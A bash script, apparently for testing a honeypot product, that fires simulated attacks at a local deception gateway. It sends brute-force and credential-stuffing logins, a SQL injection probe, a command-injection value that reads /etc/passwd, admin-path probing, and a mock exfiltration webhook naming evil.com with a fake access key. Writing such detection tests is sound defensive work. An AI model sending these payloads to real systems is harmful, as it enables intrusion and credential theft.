#!/usr/bin/env bash
# Simulate diverse attack patterns against HoneyPot+ deception layer
set -euo pipefail

# Target the HONEYPOT gateway only — not the dashboard port
BASE="${1:-http://localhost:8080}"
CURL=(curl -s)
echo "=== HoneyPot+ Attack Simulation ==="
echo "Target: $BASE"
echo ""

echo "[1/8] Browse login page"
"${CURL[@]}" -o /dev/null -w "  %{http_code}\n" "$BASE/login"

echo "[2/8] Brute-force login (5 attempts)"
for i in $(seq 1 5); do
  "${CURL[@]}" -X POST "$BASE/auth/login" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@test.com\",\"password\":\"pass$i\"}" -o /dev/null
done
echo "  done"

echo "[3/8] Credential stuffing (multiple emails)"
for email in user1@test.com user2@test.com user3@test.com user4@test.com user5@test.com; do
  "${CURL[@]}" -X POST "$BASE/auth/login" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$email\",\"password\":\"password123\"}" -o /dev/null
done
echo "  done"

echo "[4/8] SQL injection probe"
"${CURL[@]}" -o /dev/null "$BASE/api/v1/search?q='%20OR%201=1--"

echo "[5/8] RCE attempt"
"${CURL[@]}" -o /dev/null "$BASE/api/v1/search?q=;cat%20/etc/passwd"

echo "[6/8] Scanner fingerprint"
"${CURL[@]}" -o /dev/null -A "sqlmap/1.0" "$BASE/api/v1/users"

echo "[7/8] Cross-service probing"
"${CURL[@]}" -o /dev/null "$BASE/admin"
"${CURL[@]}" -o /dev/null "$BASE/admin/api/keys"
"${CURL[@]}" -o /dev/null "$BASE/api/v1/config"
"${CURL[@]}" -o /dev/null "$BASE/api/v1/internal/debug"
"${CURL[@]}" -o /dev/null "$BASE/auth/token" -X POST -d '{}'

echo "[8/8] Honeytoken exfil attempt"
"${CURL[@]}" -o /dev/null -X POST "$BASE/api/v1/webhooks" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://evil.com","secret":"AKIA4ACME7DEPLOY01"}'

echo ""
echo "=== Simulation complete ==="
echo "Check dashboard at http://localhost:9090 — events appear within ~2 seconds."